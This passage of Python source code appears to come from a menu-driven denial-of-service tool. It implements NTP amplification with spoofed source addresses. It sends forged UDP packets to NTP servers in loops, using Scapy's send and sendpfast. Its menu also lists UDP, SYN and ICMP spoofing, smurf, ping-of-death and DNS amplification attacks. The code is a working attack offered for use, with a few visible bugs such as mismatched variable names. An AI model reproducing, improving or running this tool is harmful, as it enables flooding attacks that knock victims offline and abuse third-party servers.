    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mNTP Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    choiceNtpListe = """
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║   \033[0;32mPlease select your \033[1;95moption \033[1;95m:\033[00m                                 ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║           \033[1;95m1 \033[0;32m= Specify a NTP Server \033[00m                           ║
\033[1;00m                    ║           \033[1;95m2 \033[0;32m= Use default list of NTP Server \033[00m                 ║
\033[1;00m                    ║           \033[1;95m3 \033[0;32m= Wordlist with your list of NTP Server  \033[00m        ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
    """
    print(choiceNtpListe)
    choice = input(left)
    choice2 = input("\n\033[0;32mDo you wan't smooth attack for demo (\033[1;95mYes = 1 \033[0;32m/ \033[1;95mNo = 2\033[0;32m) :\033[00m ")
    cons = int(cons)
    if choice2 == "1":
        if choice == "1":
            dnsDestination = input("\n\033[0;32mEnter the \033[1;95mIP of NTP Server \033[0;32m: \033[1;00m ")
            ip = IP(src = ipTarget, dst = dnsDestination)
            udp = UDP(sport=48947,dport=123)
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                while cons != 0:
                    send(ip/udp/Raw(load = data))
                    cons = cons - 1
        elif choice == "2":
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                while cons != 0:
                    cons = cons - 1
                    for server in range(len(serverntp)):
                        ip = IP(src = ipTarget, dst = serverntp[server])
                        udp = UDP(dport = 123, sport = 8000)
                        send(ip/udp/data)
        else : 
            print("\033[1;95mCommand Not Found !\033[00m")
            time.sleep(3)
            udpSpoof()
    elif choice2 == "2":
        if choice == "1":
            dnsDestination = input("\n\033[0;32mEnter the \033[1;95mIP of DNS resolver \033[0;32m: \033[1;00m ")
            ip = IP(src = ipTarget, dst = dnsDestination)
            udp = UDP(dport = 123, sport = 8000)
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                packet = Ether()/ip/udp/data
                sendpfast(packet*100, loop = int(cons)) 
        elif choice == "2":
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                for server in range(len(serverdns)):    
                    ip = IP(src = ipTarget, dst = serverdns[serveur])
                    udp = UDP(dport = 123, sport = 8000)
                    packet = Ether()/ip/udp/data
                    sendpfast(packet*100, loop = int(cons))
        else : 
            print("\033[1;95mCommand Not Found !\033[00m")
            time.sleep(3)
            udpSpoof()
    else : 
        print("\033[1;95mCommand Not Found !\033[00m")
        time.sleep(3)
        udpSpoof()

def main():
    while True:
        os.system("clear")
        print(banner)
        print(helpBanner)
        sys.stdout.write(top)
        sin = input(left).lower()
        sinput = sin.split(" ")[0]
        if sinput == "1":
            udpSpoof()
        elif sinput == "2":
            synSpoof()
        elif sinput == "3":
            icmpSpoof()
        elif sinput == "4":
            smurfAttack()
        elif sinput == "5":
            pingOfDeath()
        elif sinput == "6":
            amplificationDns()
        elif sinput == "7":
            amplificationNtp()
        elif sinput == "9":
            os.system("clear")
            exit()

main()
